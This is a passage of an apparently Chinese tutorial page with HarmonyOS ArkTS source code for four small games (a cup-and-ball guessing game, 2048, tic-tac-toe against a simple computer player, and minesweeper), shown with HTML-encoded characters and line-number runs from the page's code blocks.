adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs * 2, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = 0 &#125;) animateToImmediately(&#123; delay: 0, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs * 2, duration: this.animationDurationMs, onFinish: () =&gt; &#123; this.swapBalls(cupIndex1, cupIndex2) &#125; &#125;, () =&gt; &#123; this.gameCups[cupIndex2].positionX = -(this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex2].positionY = 0 &#125;) &#125; // 重置杯子的位置 resetCupPosition(cupIndex: number) &#123; this.gameCups[cupIndex].positionX = 0; this.gameCups[cupIndex].positionY = 0; &#125; // 交换两个杯子内的球 swapBalls(cupIndex1: number, cupIndex2: number) &#123; this.resetCupPosition(cupIndex1); this.resetCupPosition(cupIndex2); let temporaryBallStatus = this.gameCups[cupIndex1].containsBall; this.gameCups[cupIndex1].containsBall = this.gameCups[cupIndex2].containsBall; this.gameCups[cupIndex2].containsBall = temporaryBallStatus; if (this.currentMixingCount &lt;= 0) &#123; this.isGameAnimating = false; &#125; else &#123; setTimeout(() =&gt; &#123; this.startGame(); &#125;, 10); &#125; &#125; // 构建游戏界面 build() &#123; Column(&#123; space: 20 &#125;) &#123; // 游戏标题 Text(&#x27;猜小球游戏&#x27;) .fontSize(24) .margin(&#123; top: 20 &#125;); // 动画速度控制器 Counter() &#123; Text(`当前速度$&#123;this.animationDurationMs&#125;毫秒`) .fontColor(Color.Black) .fontSize(&#x27;26lpx&#x27;); &#125;.width(&#x27;400lpx&#x27;).onInc(() =&gt; &#123; this.animationDurationMs += 10; &#125;).onDec(() =&gt; &#123; this.animationDurationMs -= 10; this.animationDurationMs = this.animationDurationMs &lt; 10 ? 10 : this.animationDurationMs; &#125;); // 混合次数控制器 Counter() &#123; Text(`每局混合$&#123;this.mixingCount&#125;次`) .fontColor(Color.Black) .fontSize(&#x27;26lpx&#x27;); &#125;.width(&#x27;400lpx&#x27;).onInc(() =&gt; &#123; this.mixingCount += 1; &#125;).onDec(() =&gt; &#123; this.mixingCount -= 1; this.mixingCount = this.mixingCount &lt; 1 ? 1 : this.mixingCount &#125;); // 杯子布局 Row() &#123; ForEach(this.gameCups, (cup: Cup) =&gt; &#123; Text(cup.isRevealed ? (cup.containsBall ? &#x27;小球&#x27; : &#x27;空&#x27;) : &#x27;&#x27;) .width(`$&#123;this.cupWidth&#125;lpx`) .height(`$&#123;this.cupWidth&#125;lpx`) .margin(`$&#123;this.cupSpacing&#125;lpx`) .backgroundColor(Color.Orange) .fontSize(`$&#123;this.cupWidth / 4&#125;lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .borderRadius(5) .translate(&#123; x: `$&#123;cup.positionX&#125;lpx`, y: `$&#123;cup.positionY&#125;lpx` &#125;) .onClick(() =&gt; &#123; if (!this.isGameAnimating) &#123; cup.isRevealed = true; &#125; &#125;); &#125;); &#125;.justifyContent(FlexAlign.Center).width(&#x27;100%&#x27;).height(&#x27;720lpx&#x27;).backgroundColor(Color.Gray); // 开始游戏按钮 Button(&#x27;开始游戏&#x27;).onClick(() =&gt; &#123; if (!this.isGameAnimating) &#123; this.currentMixingCount = this.mixingCount; this.isGameAnimating = true; this.gameCups.forEach(cup =&gt; cup.isRevealed = false); this.startGame(); &#125; &#125;); &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;); &#125;&#125; 2048123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302// 使用装饰器标记Cell类，可能表示该类具有可观测性@ObservedV2class Cell &#123; // 使用Trace装饰器标记value属性，可能表示该属性的变化会被追踪 @Trace value: number; // 构造函数初始化单元格的值为0 constructor() &#123; this.value = 0; &#125;&#125; // 使用Entry和Component装饰器标记Game2048结构体，可能表示这是程序的入口点，并且该结构体定义了一个组件@Entry@Component // 定义Game2048结构体struct Game2048 &#123; // 使用State装饰器标记状态变量，可能表示这些变量是组件的状态 @State board: Cell[][] = []; // 游戏盘面 @State score: number = 0; // 分数 @State cellSize: number = 200; // 单元格大小 @State cellMargin: number = 5; // 单元格之间的边距 @State screenStartX: number = 0; // 触摸开始时的屏幕X坐标 @State screenStartY: number = 0; // 触摸开始时的屏幕Y坐标 @State lastScreenX: number = 0; // 触摸结束时的屏幕X坐标 @State lastScreenY: number = 0; // 触摸结束时的屏幕Y坐标 // 定义颜色数组 colors: string[] = [ &#x27;#CCCCCC&#x27;, // 0 - 灰色 &#x27;#FFC107&#x27;, // 2 - 黄色 &#x27;#FF9800&#x27;, // 4 - 橙色 &#x27;#FF5722&#x27;, // 8 - 深橙色 &#x27;#F44336&#x27;, // 16 - 红色 &#x27;#9C27B0&#x27;, // 32 - 紫色 &#x27;#3F51B5&#x27;, // 64 - 蓝紫色 &#x27;#00BCD4&#x27;, // 128 - 蓝色 &#x27;#009688&#x27;, // 256 - 深青色 &#x27;#4CAF50&#x27;, // 512 - 绿色 &#x27;#8BC34A&#x27;, // 1024 - 浅绿色 &#x27;#CDDC39&#x27;, // 2048 - 柠檬黄 &#x27;#FFEB3B&#x27;, // 4096 - 淡黄色 &#x27;#795548&#x27;, // 8192 - 棕色 &#x27;#607D8B&#x27;, // 16384 - 深灰色 &#x27;#9E9E9E&#x27;, // 32768 - 灰色 &#x27;#000000&#x27; // 以上 - 黑色 ]; // 游戏即将出现时执行的方法 aboutToAppear() &#123; this.score = 0; // 重置分数 this.initBoard(); // 重新初始化游戏板 this.addRandomTiles(2); // 添加两个随机方块 &#125; // 初始化游戏盘面 initBoard() &#123; if (this.board.length == 0) &#123; for (let i = 0; i &lt; 4; i++) &#123; let cellArr: Cell[] = []; for (let j = 0; j &lt; 4; j++) &#123; cellArr.push(new Cell()); // 创建新单元格 &#125; this.board.push(cellArr); // 添加到盘面 &#125; &#125; else &#123; for (let i = 0; i &lt; this.board.length; i++) &#123; for (let j = 0; j &lt; this.board[i].length; j++) &#123; this.board[i][j].value = 0; // 清空单元格 &#125; &#125; &#125; &#125; // 在盘面上添加指定数量的随机方块 addRandomTiles(count: number) &#123; let emptyCells: object[] = []; for (let row = 0; row &lt; 4; row++) &#123; for (let col = 0; col &lt; 4; col++) &#123; if (this.board[row][col].value === 0) &#123; emptyCells.push(Object(&#123; row: row, col: col &#125;)); // 记录空单元格位置 &#125; &#125; &#125; for (let i = 0; i &lt; count; i++) &#123; if (emptyCells.length &gt; 0) &#123; let randomIndex = Math.floor(Math.random() * emptyCells.length); let obj = emptyCells[randomIndex]; this.board[obj[&#x27;row&#x27;]][obj[&#x27;col&#x27;]].value = Math.random() &lt; 0.9 ? 2 : 4; // 随机生成2或4 emptyCells.splice(randomIndex, 1); // 移除已使用的空单元格位置 &#125; &#125; &#125; // 向左滑动 slideLeft() &#123; for (let row = 0; row &lt; 4; row++) &#123; let tempRow: number[] = []; // 临时存储行数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let col = 0; col &lt; 4; col++) &#123; if (this.board[row][col].value !== 0) &#123; tempRow.push(this.board[row][col].value); // 移动非零值 &#125; &#125; let mergePos = 0; while (mergePos &lt; tempRow.length - 1) &#123; if (tempRow[mergePos] === tempRow[mergePos + 1] &amp;&amp; !merged[mergePos]) &#123; tempRow[mergePos] *= 2; // 合并 this.score += tempRow[mergePos]; // 更新分数 merged[mergePos] = true; // 标记已合并 tempRow.splice(mergePos + 1, 1); // 移除合并过的值 &#125; else &#123; mergePos++; &#125; &#125; while (tempRow.length &lt; 4) &#123; tempRow.push(0); // 填充空位 &#125; for (let col = 0; col &lt; 4; col++) &#123; this.board[row][col].value = tempRow[col]; // 更新盘面 &#125; &#125; &#125; // 向右滑动 slideRight() &#123; for (let row = 0; row &lt; 4; row++) &#123; let tempRow: number[] = []; // 临时存储行数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let col = 3; col &gt;= 0; col--) &#123; if (this.board[row][col].value !== 0) &#123; tempRow.unshift(this.board[row][col].value); // 移动非零值 &#125; &#125; let mergePos = tempRow.length - 1; while (mergePos &gt; 0) &#123; if (tempRow[mergePos] === tempRow[mergePos - 1] &amp;&amp; !merged[mergePos - 1]) &#123; tempRow[mergePos] *= 2; // 合并 this.score += tempRow[mergePos]; // 更新分数 merged[mergePos - 1] = true; // 标记已合并 tempRow.splice(mergePos - 1, 1); // 移除合并过的值 &#125; else &#123; mergePos--; &#125; &#125; while (tempRow.length &lt; 4) &#123; tempRow.unshift(0); // 填充空位 &#125; for (let col = 0; col &lt; 4; col++) &#123; this.board[row][col].value = tempRow[col]; // 更新盘面 &#125; &#125; &#125; // 向上滑动 slideUp() &#123; for (let col = 0; col &lt; 4; col++) &#123; let tempCol: number[] = []; // 临时存储列数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 for (let row = 0; row &lt; 4; row++) &#123; if (this.board[row][col].value !== 0) &#123; tempCol.push(this.board[row][col].value); // 移动非零值 &#125; &#125; let mergePos = 0; while (mergePos &lt; tempCol.length - 1) &#123; if (tempCol[mergePos] === tempCol[mergePos + 1] &amp;&amp; !merged[mergePos]) &#123; tempCol[mergePos] *= 2; // 合并 this.score += tempCol[mergePos]; // 更新分数 merged[mergePos] = true; // 标记已合并 tempCol.splice(mergePos + 1, 1); // 移除合并过的值 &#125; else &#123; mergePos++; &#125; &#125; while (tempCol.length &lt; 4) &#123; tempCol.push(0); // 填充空位 &#125; for (let newRow = 0; newRow &lt; 4; newRow++) &#123; this.board[newRow][col].value = tempCol[newRow]; // 更新盘面 &#125; &#125; &#125; // 向下滑动 slideDown() &#123; for (let col = 0; col &lt; 4; col++) &#123; let tempCol: number[] = []; // 临时存储列数据 let merged: boolean[] = new Array(4).fill(false); // 标记是否已经合并过 // 从下往上遍历列 for (let row = 3; row &gt;= 0; row--) &#123; if (this.board[row][col].value !== 0) &#123; tempCol.unshift(this.board[row][col].value); // 移动非零值 &#125; &#125; let mergePos = tempCol.length - 1; while (mergePos &gt; 0) &#123; if (tempCol[mergePos] === tempCol[mergePos - 1] &amp;&amp; !merged[mergePos - 1]) &#123; tempCol[mergePos] *= 2; // 合并 this.score += tempCol[mergePos]; // 更新分数 merged[mergePos - 1] = true; // 标记已合并 tempCol.splice(mergePos - 1, 1); // 移除合并过的值 &#125; else &#123; mergePos--; &#125; &#125; // 如果数组长度小于4，用0填充 while (tempCol.length &lt; 4) &#123; tempCol.unshift(0); // 填充空位 &#125; // 将处理后的数组元素放回到棋盘的对应列中 for (let row = 0; row &lt; 4; row++) &#123; this.board[3 - row][col].value = tempCol[3 - row]; // 注意反转顺序 &#125; &#125; &#125; // 构建游戏界面 build() &#123; // 布局容器 Column(&#123; space: 10 &#125;) &#123; // 显示得分 Text(`得分: $&#123;this.score&#125;`) .fontSize(24) .margin(&#123; top: 20 &#125;) // 底层背景布局 Flex(&#123; wrap: FlexWrap.Wrap, direction: FlexDirection.Row &#125;) &#123; // 遍历每个单元格 ForEach(this.board.flat(), (cell: Cell, index: number) =&gt; &#123; // 显示单元格上的数字 Text(`$&#123;cell.value || &#x27;&#x27;&#125;`) .width(`$&#123;this.cellSize&#125;px`) .height(`$&#123;this.cellSize&#125;px`) .margin(`$&#123;this.cellMargin&#125;px`) .fontSize(`$&#123;cell.value &gt;= 100 ? this.cellSize / 3 : this.cellSize / 2&#125;px`) // 根据数字大小调整字体大小 .textAlign(TextAlign.Center) .backgroundColor(this.colors[cell.value == 0?0:Math.floor(Math.log2(cell.value))]) // 设置背景颜色 .fontColor(cell.value === 0 ? &#x27;#000&#x27; : &#x27;#fff&#x27;) // 设置字体颜色 .borderRadius(5) // 圆角 &#125;) &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 4&#125;px`) // 设置容器宽度 // 重新开始按钮 Button(&#x27;重新开始&#x27;).onClick(() =&gt; &#123; this.aboutToAppear(); // 重新开始游戏 &#125;) &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .onTouch((e) =&gt; &#123; if (e.type === TouchType.Down &amp;&amp; e.touches.length &gt; 0) &#123; // 触摸开始，记录初始位置 this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; &#125; else if (e.type === TouchType.Up &amp;&amp; e.changedTouches.length &gt; 0) &#123; // 当手指抬起时，更新最后的位置 this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; &#125; &#125;) .gesture( SwipeGesture(&#123; direction: SwipeDirection.All &#125;) // 支持方向中 all可以是上下左右 .onAction((_event: GestureEvent) =&gt; &#123; const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // 清除开始位置记录，准备下一次滑动判断 this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) &gt; Math.abs(swipeY)) &#123; if (swipeX &gt; 0) &#123; this.slideRight(); // 向右滑动 &#125; else &#123; this.slideLeft(); // 向左滑动 &#125; &#125; else &#123; if (swipeY &gt; 0) &#123; this.slideDown(); // 向下滑动 &#125; else &#123; this.slideUp(); // 向上滑动 &#125; &#125; this.addRandomTiles(1); // 添加一个随机方块 &#125;) ) &#125;&#125; X✔123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; const winningLines = [ [0, 0, 0, 1, 0, 2], // Horizontal 1 [1, 0, 1, 1, 1, 2], // Horizontal 2 [2, 0, 2, 1, 2, 2], // Horizontal 3 [0, 0, 1, 0, 2, 0], // Vertical 1 [0, 1, 1, 1, 2, 1], // Vertical 2 [0, 2, 1, 2, 2, 2], // Vertical 3 [0, 0, 1, 1, 2, 2], // Diagonal \\ [0, 2, 1, 1, 2, 0]// Diagonal /]; @ObservedV2class GridCell &#123; @Trace value: string = &quot;&quot;; // 当前格子的值 rowIndex: number = 0; // 格子所在的行号 colIndex: number = 0; // 格子所在的列号 constructor(rowIndex: number, colIndex: number) &#123; this.rowIndex = rowIndex; this.colIndex = colIndex; &#125;&#125;@Entry@Componentstruct TicTacToe &#123; @State board: GridCell[][] = []; // 游戏板 @State currentPlayer: string = &#x27;X&#x27;; // 当前玩家 @State isGameOver: boolean = false; // 游戏是否结束 @State winner: string = &#x27;&#x27;; // 获胜者 @State cellSize: number = 120; // 单元格大小 @State cellMargin: number = 5; // 单元格边距 // 组件即将出现时初始化游戏 aboutToAppear(): void &#123; this.board = [ [new GridCell(0, 0), new GridCell(0, 1), new GridCell(0, 2)], [new GridCell(1, 0), new GridCell(1, 1), new GridCell(1, 2)], [new GridCell(2, 0), new GridCell(2, 1), new GridCell(2, 2)] ]; this.initGame(); // 初始化游戏状态 &#125; // 重置游戏状态 initGame() &#123; for (let i = 0; i &lt; 3; i++) &#123; for (let j = 0; j &lt; 3; j++) &#123; this.board[i][j].value = &#x27;&#x27;; // 清空所有单元格 &#125; &#125; this.currentPlayer = &#x27;X&#x27;; // 设置当前玩家为X this.isGameOver = false; // 游戏未结束 this.winner = &#x27;&#x27;; // 无获胜者 &#125; // 检查是否有玩家获胜 checkForWinner() &#123; for (let line of winningLines) &#123; // 遍历所有胜利线路 const mark = this.board[line[0]][line[1]].value; if (mark &amp;&amp; // 如果有标记 mark === this.board[line[2]][line[3]].value &amp;&amp; // 并且等于同一行的下一个标记 mark === this.board[line[4]][line[5]].value) &#123; // 再次等于同一行的下一个标记 this.isGameOver = true; // 游戏结束 this.winner = mark; // 设置获胜者 return mark; // 返回获胜者的标记 &#125; &#125; const allCellsFilled = this.board.flat().every(cell =&gt; cell.value !== &#x27;&#x27;); // 检查所有单元格是否已填满 if (allCellsFilled) &#123; this.isGameOver = true; // 游戏结束 this.winner = &#x27;平局&#x27;; // 设置为平局 return &#x27;平局&#x27;; // 返回平局标识 &#125; return &#x27;&#x27;; // 无获胜者 &#125; // 玩家落子 placeMark(rowIndex: number, colIndex: number) &#123; if (!this.isGameOver &amp;&amp; this.board[rowIndex][colIndex].value === &#x27;&#x27;) &#123; // 如果游戏未结束且单元格为空 this.board[rowIndex][colIndex].value = this.currentPlayer; // 放置标记 const result = this.checkForWinner(); // 检查是否有获胜者 if (result) &#123; // 如果有获胜者 console.info(`$&#123;result&#125; 获胜！`); let message = `$&#123;result&#125; 获胜！`; // 设置提示信息 if (result === &#x27;平局&#x27;) &#123; message = &#x27;平局！&#x27;; // 如果是平局 &#125; promptAction.showDialog(&#123; // 显示对话框 title: `游戏结束`, // 标题 message, // 提示信息 buttons: [ // 按钮 &#123; text: &#x27;重新开始&#x27;, // 文本 color: &#x27;#ffa500&#x27; // 颜色 &#125; ], &#125;).then(() =&gt; &#123; this.initGame(); // 重新开始游戏 &#125;); &#125; else &#123; // 如果没有获胜者 this.currentPlayer = this.currentPlayer === &#x27;X&#x27; ? &#x27;O&#x27; : &#x27;X&#x27;; // 切换玩家 if (this.currentPlayer === &#x27;O&#x27;) &#123; // 如果是AI玩家 this.aiMove(); // AI落子 &#125; &#125; &#125; &#125; // AI落子 aiMove() &#123; let moveFound = false; let bestMove: null | number[] = null; // 寻找最佳落子位置 bestMove = this.findWinningMove(&#x27;O&#x27;); // 检查AI是否有胜利机会 console.info(`bestMove a:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; else &#123; bestMove = this.findWinningMove(&#x27;X&#x27;); // 检查玩家是否有胜利机会 console.info(`bestMove b:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; else &#123; bestMove = this.findRandomMove(); // 随机落子 console.info(`bestMove c:$&#123;JSON.stringify(bestMove)&#125;`); if (bestMove) &#123; moveFound = true; &#125; &#125; &#125; if (moveFound &amp;&amp; bestMove) &#123; // 如果找到了合适的落子位置 console.info(`bestMove:$&#123;JSON.stringify(bestMove)&#125;`); this.placeMark(bestMove[0], bestMove[1]); // 落子 &#125; &#125; // 寻找给定玩家是否有机会赢，并返回这样的移动位置 findWinningMove(player: string) &#123; for (let line of winningLines) &#123; // 遍历所有胜利线路 let missingIndex = -1; let noEmptyCount = 0; for (let i = 0; i &lt; line.length; i += 2) &#123; // 检查每个单元格 if (this.board[line[i]][line[i + 1]].value === player) &#123; // 如果是该玩家的标记 noEmptyCount++; // 计数 &#125; else if (this.board[line[i]][line[i + 1]].value === &#x27;&#x27;) &#123; // 如果为空 missingIndex = i; // 记录空格位置 &#125; &#125; if (noEmptyCount === 2 &amp;&amp; missingIndex != -1) &#123; // 如果有两个标记且有一个空格 return [line[missingIndex], line[missingIndex + 1]]; // 返回空格位置 &#125; &#125; return null; // 未找到合适位置 &#125; // 寻找一个随机的合法落子位置 findRandomMove() &#123; let emptyCells: number[][] = []; // 存储空格位置 for (let i = 0; i &lt; 3; i++) &#123; for (let j = 0; j &lt; 3; j++) &#123; if (this.board[i][j].value === &#x27;&#x27;) &#123; // 如果单元格为空 emptyCells.push([i, j]); // 添加到空格列表 &#125; &#125; &#125; if (emptyCells.length &gt; 0) &#123; // 如果有空格 return emptyCells[Math.floor(Math.random() * emptyCells.length)]; // 随机选择一个空格 &#125; return null; // 未找到空格 &#125; // 构建游戏界面 build() &#123; Column(&#123; space: 20 &#125;) &#123; // 创建主列布局 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // 创建主行布局 ForEach(this.board, (row: GridCell[], _index: number) =&gt; &#123; // 遍历每一行 ForEach(row, (cell: GridCell, _index: number) =&gt; &#123; // 遍历每一个单元格 Text(cell.value) // 显示单元格内的文本 .width(`$&#123;this.cellSize&#125;lpx`) // 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`) // 设置高度 .margin(`$&#123;this.cellMargin&#125;lpx`) // 设置边距 .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) // 设置字体大小 .textAlign(TextAlign.Center) // 居中文本 .backgroundColor(cell.value === &#x27;X&#x27; ? Color.Red : // 设置背景颜色 cell.value === &#x27;O&#x27; ? Color.Blue : Color.Gray) .fontColor(Color.White) // 设置字体颜色 .borderRadius(5) // 设置圆角 .onClick(() =&gt; &#123; // 点击事件 this.placeMark(cell.rowIndex, cell.colIndex); // 落子 &#125;); &#125;) &#125;) &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 3&#125;lpx`) // 设置宽度 Button(&#x27;重新开始&#x27;) // 重新开始按钮 .width(&#x27;50%&#x27;) // 设置宽度 .height(&#x27;10%&#x27;) // 设置高度 .onClick(() =&gt; &#123; // 点击事件 this.initGame(); // 重新开始游戏 &#125;); &#125; .width(&#x27;100%&#x27;) // 设置宽度 .height(&#x27;100%&#x27;); // 设置高度 &#125;&#125; mine扫雷 实现步骤 步骤1：定义游戏状态 首先，我们需要定义游戏的状态变量，包括游戏面板数据、地雷数量、已揭示方块集合、标记为地雷的方块集合等。 步骤2：初始化游戏 在组件即将显示时初始化游戏，包括清空状态变量、生成游戏面板、放置地雷等。 步骤3：生成游戏面板与放置地雷 游戏面板由10x10的方块组成，随机放置10个地雷，并计算每个方块周围的地雷数量。 步骤4：处理用户交互 用户可以通过点击方块来揭示其内容，也可以通过长按来标记地雷。 步骤5：显示游戏结果 当玩家揭示到地雷时，游戏结束；当所有非雷方块都被揭示时，游戏胜利。 步骤6：定义Cell类 最后，定义一个Cell类来存储每个方块的信息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; @Entry@Componentstruct MineSweeper &#123; // 游戏面板数据 @State private gameBoard: Cell[][] = []; // 地雷总数 @State private mineCount: number = 10; // 已经揭示的方块集合 @State private revealedCells: Set&lt;string&gt; = new Set(); // 标记为地雷的方块集合 @State private flaggedCells: Set&lt;string&gt; = new Set(); // 方块大小 @State private cellSize: number = 60; // 方块之间的边距 @State private cellMargin: number = 2; // 游戏开始时间 private startTime: number = Date.now(); // 游戏结束标志 @State private isGameOver: boolean = false; // 在组件即将显示时初始化游戏 aboutToAppear(): void &#123; this.initializeGame(); &#125; // 初始化游戏 private initializeGame() &#123; this.isGameOver = false; this.startTime = Date.now(); this.revealedCells.clear(); this.flaggedCells.clear(); this.generateBoard(); &#125; // 生成游戏面板 private generateBoard() &#123; this.gameBoard = []; for (let i = 0; i &lt; 10; i++) &#123; this.gameBoard.push([]); for (let j = 0; j &lt; 10; j++) &#123; this.gameBoard[i].push(new Cell(i, j)); &#125; &#125; this.placeMines(); this.calculateNumbers(); &#125; // 随机放置地雷 private placeMines() &#123; let placed = 0; while (placed &lt; this.mineCount) &#123; let x = Math.floor(Math.random() * 10); let y = Math.floor(Math.random() * 10); if (!this.gameBoard[x][y].hasMine) &#123; this.gameBoard[x][y].hasMine = true; placed++; &#125; &#125; &#125; // 计算每个方块周围的地雷数量 private calculateNumbers() &#123; for (let i = 0; i &lt; 10; i++) &#123; for (let j = 0; j &lt; 10; j++) &#123; if (!this.gameBoard[i][j].hasMine) &#123; this.gameBoard[i][j].neighborMines = this.countNeighborMines(i, j); this.gameBoard[i][j].value = this.gameBoard[i][j].neighborMines.toString(); &#125; else &#123; this.gameBoard[i][j].value = &#x27;雷&#x27;; &#125; &#125; &#125; &#125; // 计算给定坐标周围地雷的数量 private countNeighborMines(row: number, col: number): number &#123; let count = 0; for (let dx = -1; dx &lt;= 1; dx++) &#123; for (let dy = -1; dy &lt;= 1; dy++) &#123; if (dx === 0 &amp;&amp; dy === 0) &#123; continue; &#125; let newRow = row + dx, newCol = col + dy; if (newRow &gt;= 0 &amp;&amp; newRow &lt; 10 &amp;&amp; newCol &gt;= 0 &amp;&amp; newCol &lt; 10 &amp;&amp; this.gameBoard[newRow][newCol].hasMine) &#123; count++; &#125; &#125; &#125; return count; &#125; // 揭示方块 private revealCell(row: number, col: number) &#123; if (this.isGameOver || this.revealedCells.has(`$&#123;row&#125;,$&#123;col&#125;`)) &#123; return; &#125; const key = `$&#123;row&#125;,$&#123;col&#125;`; this.revealedCells.add(key); if (this.gameBoard[row][col].hasMine) &#123; this.showGameOverDialog(); &#125; else &#123; if (this.gameBoard[row][col].neighborMines === 0) &#123; for (let dx = -1; dx &lt;= 1; dx++) &#123; for (let dy = -1; dy &lt;= 1; dy++) &#123; if (dx === 0 &amp;&amp; dy === 0) &#123; continue; &#125; let newRow = row + dx, newCol = col + dy; if (newRow &gt;= 0 &amp;&amp; newRow &lt; 10 &amp;&amp; newCol &gt;= 0 &amp;&amp; newCol &lt; 10) &#123; this.revealCell(newRow, newCol); &#125; &#125; &#125; &#125; &#125; if (this.isVictory()) &#123; this.showVictoryDialog(); &#125; &#125; // 显示游戏结束对话框 private showGameOverDialog() &#123; this.isGameOver = true; promptAction.showDialog(&#123; title: &#x27;游戏结束: 游戏失败！&#x27;, buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initializeGame(); &#125;); &#125; // 显示胜利对话框 private showVictoryDialog() &#123; this.isGameOver = true; promptAction.showDialog(&#123; title: &#x27;恭喜你，游戏胜利！&#x27;, message: `用时：$&#123;((Date.now() - this.startTime) / 1000).toFixed(3)&#125;秒`, buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.initializeGame(); &#125;); &#125; // 判断游戏是否胜利 private isVictory() &#123; let revealedNonMineCount = 0; for (let i = 0; i &lt; this.gameBoard.length; i++) &#123; for (let j = 0; j &lt; this.gameBoard[i].length; j++) &#123; if (this.revealedCells.has(`$&#123;i&#125;,$&#123;j&#125;`)) &#123; revealedNonMineCount++; &#125; &#125; &#125; return revealedNonMineCount == 90; &#125; // 决定是否显示方块值 private isShowValue(cell: Cell): string &#123; if (this.isGameOver) &#123; return cell.value === &#x27;0&#x27; ? &#x27;&#x27; : cell.value; &#125; else &#123; if (this.revealedCells.has(`$&#123;cell.row&#125;,$&#123;cell.column&#125;`)) &#123; return cell.value === &#x27;0&#x27; ? &#x27;&#x27; : cell.value; &#125; else &#123; return &#x27;&#x27;; &#125; &#125; &#125; build() &#123; Column(&#123; space: 10 &#125;) &#123; // 重置游戏按钮 Button(&#x27;重新开始&#x27;).onClick(() =&gt; this.initializeGame()); // 创建游戏面板容器 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // 遍历每一行 ForEach(this.gameBoard, (row: Cell[], rowIndex: number) =&gt; &#123; // 遍历每一列 ForEach(row, (cell: Cell, colIndex: number) =&gt; &#123; Stack() &#123; // 显示方块上的数字或雷 Text(this.isShowValue(cell)) .width(`$&#123;this.cellSize&#125;lpx`) .height(`$&#123;this.cellSize&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) .textAlign(TextAlign.Center) .backgroundColor(this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) ? (this.isShowValue(cell) === &#x27;雷&#x27; ? Color.Red : Color.White) : Color.Gray) .fontColor(!this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) || this.isShowValue(cell) === &#x27;雷&#x27; ? Color.White : Color.Black) .borderRadius(5) .parallelGesture(GestureGroup(GestureMode.Exclusive, TapGesture(&#123; count: 1, fingers: 1 &#125;) .onAction(() =&gt; this.revealCell(rowIndex, colIndex)), LongPressGesture(&#123; repeat: true &#125;) .onAction(() =&gt; cell.isFlag = true) )); // 显示标记旗帜 Text(`$&#123;!this.revealedCells.has(`$&#123;rowIndex&#125;,$&#123;colIndex&#125;`) ? &#x27;旗&#x27; : &#x27;&#x27;&#125;`) .width(`$&#123;this.cellSize&#125;lpx`) .height(`$&#123;this.cellSize&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) .textAlign(TextAlign.Center) .fontColor(Color.White) .visibility(cell.isFlag &amp;&amp; !this.isGameOver ? Visibility.Visible : Visibility.None) .onClick(() =&gt; &#123; cell.isFlag = false; &#125;) &#125; &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellMargin * 2) * 10&#125;lpx`); &#125; 